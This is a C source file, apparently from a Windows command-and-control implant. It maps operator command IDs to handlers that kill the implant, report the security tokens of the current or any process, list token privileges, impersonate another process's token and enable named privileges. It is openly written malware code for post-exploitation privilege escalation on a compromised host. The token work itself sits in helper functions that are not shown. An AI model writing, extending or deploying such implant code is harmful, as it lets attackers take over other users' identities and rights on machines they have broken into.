#include "command.h"

#define UTF8_WIDE_NULL_TERMINATOR_COUNT 1U

/* Maps each generated command identifier to its synchronous command handler. */
CONST COMMAND_MAP G_CommandTable[] = {
	{ CMD_KILLIMPLANT, CmdKillImplant },
	{ CMD_CURRENT_TOKEN, CmdCurrentToken },
	{ CMD_PROCESS_TOKEN, CmdProcessToken },
	{ CMD_TOKEN_PRIVILEGES, CmdTokenPrivileges },
	{ CMD_IMPERSONATE_TOKEN, CmdImpersonateToken },
	{ CMD_ENABLE_PRIVILEGE, CmdEnablePrivilege }
};

/**
 * @brief Converts a UTF-8 byte buffer into a heap-allocated wide string.
 *
 * @param dataLen The length of the UTF-8 input buffer in bytes.
 * @param data The UTF-8 input buffer.
 * @param wideString Receives the heap-allocated wide string on success.
 *
 * @return NO_ERROR on success, or a numeric error code on failure.
 */
static DWORD ConvertUtf8ToWideString(
	DWORD dataLen,
	CONST PBYTE data,
	PWSTR* wideString
)
{
	INT wideCharCount = 0;
	PWSTR buffer = NULL;

	ASSERT(wideString != NULL);

	*wideString = NULL;
	if (data == NULL || dataLen == 0)
	{
		return ERROR_INVALID_REQUEST;
	}

	wideCharCount = MultiByteToWideChar(
		CP_UTF8,
		0,
		(LPCCH)data,
		(INT)dataLen,
		NULL,
		0
	);
	if (wideCharCount <= 0)
	{
		return ERROR_INVALID_REQUEST;
	}

	buffer = (PWSTR)ImplantHeapAlloc(
		((SIZE_T)wideCharCount + UTF8_WIDE_NULL_TERMINATOR_COUNT) *
		sizeof(WCHAR)
	);
	if (buffer == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	if (MultiByteToWideChar(
		CP_UTF8,
		0,
		(LPCCH)data,
		(INT)dataLen,
		buffer,
		wideCharCount
	) <= 0)
	{
		ImplantHeapFree(buffer);
		return ERROR_INVALID_REQUEST;
	}

	buffer[wideCharCount] = L'\0';
	*wideString = buffer;
	return NO_ERROR;
}

DWORD CmdKillImplant(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	*responseData = NULL;
	*responseLen = 0;
	RequestImplantTermination();

	return NO_ERROR;
}

DWORD CmdCurrentToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	return BuildCurrentTokenSummaryResponse(responseData, responseLen);
}

DWORD CmdProcessToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD processId = 0;

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	processId = *(DWORD*)data;
	return BuildProcessTokenSummaryResponse(processId, responseData, responseLen);
}

DWORD CmdTokenPrivileges(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD processId = 0;

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	processId = *(DWORD*)data;
	return BuildTokenPrivilegesResponse(processId, responseData, responseLen);
}

DWORD CmdImpersonateToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD processId = 0;

	UNREFERENCED_PARAMETER(responseData);
	UNREFERENCED_PARAMETER(responseLen);

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	processId = *(DWORD*)data;
	return ImpersonateProcessToken(processId);
}

DWORD CmdEnablePrivilege(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	PWSTR privilegeName = NULL;

	UNREFERENCED_PARAMETER(responseData);
	UNREFERENCED_PARAMETER(responseLen);

	status = ConvertUtf8ToWideString(dataLen, data, &privilegeName);
	if (status != NO_ERROR)
	{
		return status;
	}

	status = EnableCurrentTokenPrivilege(privilegeName);
	ImplantHeapFree(privilegeName);
	return status;
}

DWORD ExecuteCommandById(
	DWORD cmdId,
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	for (DWORD i = 0; i < ARRAYSIZE(G_CommandTable); i++)
	{
		if ((DWORD)G_CommandTable[i].id == cmdId)
		{
			return G_CommandTable[i].handler(
				dataLen,
				data,
				responseData,
				responseLen
			);
		}
	}

	return ERROR_UNKNOWN_COMMAND;
}
